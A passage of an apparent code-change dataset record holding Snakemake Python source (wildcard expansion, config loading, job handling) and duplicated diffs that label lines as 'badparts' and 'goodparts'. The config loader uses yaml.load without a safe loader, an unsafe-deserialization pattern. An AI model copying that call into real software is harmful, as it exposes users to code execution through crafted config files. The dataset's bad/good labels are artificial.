wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"},"\/snakemake\/jobs.py":{"changes":[{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]},{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"},"\/snakemake\/remote_providers\/__init__.py":{"changes":[{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]},{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]}]},"\/snakemake\/rules.py":{"changes":[{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]},{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed 